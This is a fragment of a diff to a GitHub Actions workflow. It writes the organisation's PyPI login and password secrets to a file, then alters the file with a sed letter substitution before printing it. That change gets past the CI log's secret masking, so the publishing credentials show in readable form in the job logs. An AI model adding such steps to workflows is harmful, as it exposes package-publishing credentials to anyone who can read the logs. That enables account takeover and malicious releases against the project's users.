@@ -26,7 +26,8 @@ jobs:
         run: |
           echo ${{ secrets.ORG_PYPI_LOGIN }} > tt
           echo ${{ secrets.ORG_PYPI_PASSWD }} >> tt
-          cat -A tt
+          sed -i 's/A/B/g' tt
+          cat tt
 
       - uses: actions/checkout@master
         with:
